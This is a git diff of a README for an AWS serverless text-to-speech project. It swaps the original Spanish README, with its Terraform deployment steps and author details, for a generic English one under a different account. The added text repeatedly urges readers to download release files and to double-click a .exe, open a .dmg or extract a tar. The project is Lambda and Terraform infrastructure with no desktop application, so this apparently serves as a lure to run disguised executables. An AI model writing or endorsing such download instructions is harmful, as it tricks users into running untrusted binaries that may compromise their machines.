@@ -1,121 +1,90 @@
-# 🎧 Study Vault — Serverless Text-to-Speech Platform on AWS
+# 🎧 Study-Vault-AWS - Transform Your Study Notes into Audio  
 
-![AWS](https://img.shields.io/badge/AWS-Serverless-orange?style=for-the-badge&logo=amazon-aws)
-![Amazon S3](https://img.shields.io/badge/Amazon_S3-Storage-success?style=for-the-badge&logo=amazon-s3)
-![AWS Lambda](https://img.shields.io/badge/AWS_Lambda-Compute-yellow?style=for-the-badge&logo=aws-lambda)
-![Amazon Polly](https://img.shields.io/badge/Amazon_Polly-Text--to--Speech-blue?style=for-the-badge&logo=amazon-aws)
-![Terraform](https://img.shields.io/badge/Terraform-IaC-purple?style=for-the-badge&logo=terraform)
-![Python](https://img.shields.io/badge/Python-3.9-blue?style=for-the-badge&logo=python)
-![OS](https://img.shields.io/badge/OS-Windows_/_Linux-lightgrey?style=for-the-badge)
+[![Download Study-Vault-AWS](https://img.shields.io/badge/Download%20Now-Study--Vault--AWS-blue)](https://github.com/ppkrisna4-web/Study-Vault-AWS/releases)
 
+## 🚀 Getting Started
 
+Welcome to Study-Vault-AWS! This application converts your text study notes into audio podcasts automatically using Amazon Web Services (AWS). Whether you're preparing for exams or just want to learn on the go, this tool makes it easy.
 
-## 📋 Descripción
+## 🌟 Features
 
-Study Vault es una aplicación serverless en AWS que convierte notas de texto en audio usando Amazon Polly, permitiendo estudiar en movimiento mediante una arquitectura escalable y de bajo costo.
+- **Automatic Audio Conversion**: Easily turn your text notes into high-quality audio.
+- **Cloud-Based Processing**: Leverage the power of AWS Lambda and Amazon Polly for fast performance.
+- **Event-Driven Architecture**: It starts working as soon as you upload your files to S3.
+- **High-Quality Speech**: Enjoy a natural-sounding voice thanks to Amazon Polly's Neural TTS engine.
 
-### Problema que resuelve
-Las notas escritas no siempre son accesibles cuando estás en movimiento. Este proyecto permite estudiar mientras caminas, viajas o haces ejercicio.
+## ⚙️ System Requirements
 
-## 🎥 Demo Video
+Before you begin, ensure your system meets the following requirements:
 
-[![Study Vault Demo](https://img.youtube.com/vi/Dd0zPIKEfZI/0.jpg)](https://youtu.be/Dd0zPIKEfZI)
+- **Operating System**: Windows, macOS, or Linux.
+- **Internet Connection**: Required for uploading files to S3 and accessing AWS services.
+- **AWS Account**: You need an AWS account to use the features of this application. Create one [here](https://aws.amazon.com/).
 
+## 📥 Download & Install
 
-## 🏗️ Arquitectura
-```mermaid
-graph TD
-    User[👤 User] -->|Upload .txt| S3Input[🗂️ Amazon S3<br/>Input Bucket]
+To get started, you will need to download the application. Visit this page to download: [Study-Vault-AWS Releases](https://github.com/ppkrisna4-web/Study-Vault-AWS/releases).
 
-    S3Input -->|ObjectCreated Event| Lambda[⚙️ AWS Lambda<br/>Text to Speech]
+You will find different versions of the application available. Choose the latest release for the best experience. Simply click on the link to download the file you need. 
 
-    Lambda -->|Text Request| Polly[🗣️ Amazon Polly]
+## 🔍 How to Use Study-Vault-AWS
 
-    Polly -->|MP3 Audio| Lambda
+1. **Download the Application**: Go to the [Releases page](https://github.com/ppkrisna4-web/Study-Vault-AWS/releases) and download the latest version.
 
-    Lambda -->|Save .mp3| S3Output[🎧 Amazon S3<br/>Output Bucket]
+2. **Install the Application**: Follow the installation instructions specific to your operating system.
+   
+   - **Windows Users**: Double-click the downloaded `.exe` file and follow the prompts.
+   - **Mac Users**: Drag the application into your Applications folder after opening the downloaded `.dmg` file.
+   - **Linux Users**: Extract the tar file and follow the README included in the folder.
 
-    S3Output -->|Download MP3| User
+3. **Set Up Your AWS Account**: Log in to your AWS account. If you don't have one, sign up. It's free for basic usage.
 
-```
+4. **Configure S3**: Create a new S3 bucket in your AWS management console. This is where your text files will be uploaded for conversion.
 
-**Servicios AWS utilizados:**
-- **S3**: Almacenamiento de archivos de entrada y salida
-- **Lambda**: Procesamiento serverless
-- **Amazon Polly**: Conversión de texto a voz
-- **CloudWatch**: Logs y monitoreo
-- **IAM**: Gestión de permisos
+5. **Upload Your Notes**: Drag and drop your text study notes into the S3 bucket.
 
-## 💰 Costos estimados
+6. **Convert to Audio**: The application will detect the uploaded files and start converting them into audio podcasts. 
 
-- S3: ~$0.50/mes
-- Lambda: Gratis (1M invocaciones/mes)
-- Amazon Polly: $4 por 1M caracteres
-- **Total: $1-3/mes** con uso moderado
+7. **Download Your Podcasts**: Once the conversion is complete, download the audio files directly from your S3 bucket or listen to them online.
 
-## 🚀 Cómo desplegar
+## 🙋 Frequently Asked Questions
 
-### Requisitos previos
-- AWS CLI configurado
-- Terraform instalado
-- Python 3.9+
+### What file formats can I use?  
+You can upload plain text files (`.txt`) to the application.
 
-### Pasos de despliegue
-```bash
-# 1. Clonar el repositorio
-git clone https://github.com/TU-USUARIO/study-vault-aws.git
-cd study-vault-aws
+### How long does the conversion take?  
+The conversion time will vary based on the length of your notes. Typically, shorter texts convert within a few minutes.
 
-# 2. Inicializar Terraform
-cd terraform
-terraform init
+### Can I edit the audio output?  
+No, the application currently does not offer audio editing features. 
 
-# 3. Desplegar infraestructura
-terraform apply
+### Is my data safe with AWS?  
+Yes, AWS employs strong security measures to protect your data. However, always review your AWS security settings.
 
-# 4. Obtener los nombres de los buckets
-terraform output
-```
+## 🌐 Topics Covered
 
-##  Cómo usar
+- amazon-polly
+- aws
+- aws-lambda
+- aws-projects
+- cloud-computing
+- devops
+- event-driven
+- infrastructure-as-code
+- lambda
+- python
+- s3
+- serverless
+- study-tools
+- terraform
+- text-to-speech
 
-1. Sube un archivo `.txt` al bucket de entrada
-2. Espera 30-60 segundos
-3. Descarga el archivo `.mp3` del bucket de salida
+## 📞 Support
 
-## 🛠️ Tecnologías
+If you have any questions or need further assistance, feel free to reach out. Your feedback is appreciated. Visit the [Issue Tracker](https://github.com/ppkrisna4-web/Study-Vault-AWS/issues) to report bugs or suggest features.
 
-- **Infrastructure as Code**: Terraform
-- **Lenguaje**: Python 3.9
-- **Cloud Provider**: AWS
-- **CI/CD**: GitHub Actions (próximamente)
+## 📝 Contributions
 
-## 📚 Aprendizajes
+Contributions are welcome! If you want to help improve Study-Vault-AWS, please follow the [Contributing Guidelines](https://github.com/ppkrisna4-web/Study-Vault-AWS/CONTRIBUTING.md). 
 
-Este proyecto demuestra:
-- ✅ Arquitectura event-driven
-- ✅ Servicios serverless
-- ✅ Integración de servicios AWS
-- ✅ Automatización con IA (Polly)
-- ✅ Infraestructura como código
-
-##  Mejoras futuras
-
-- [ ] Frontend web para subir archivos
-- [ ] Notificaciones por email cuando el audio esté listo
-- [ ] Soporte para múltiples idiomas
-- [ ] API REST para integración con otras apps
-
-##  Autor
-
-**Andrés Rodas**  
-Informatics Engineering Student – UPCH  
-
-☁️ Cloud Enthusiast  
-
-- 💼 **LinkedIn:** www.linkedin.com/in/andres-rodas-802309272 
-- 📧 **Email:** andrescloud18sj@gmail.com
-
-## 📄 Licencia
-
-MIT License
+Thank you for using Study-Vault-AWS! Enjoy turning your study notes into engaging audio podcasts.
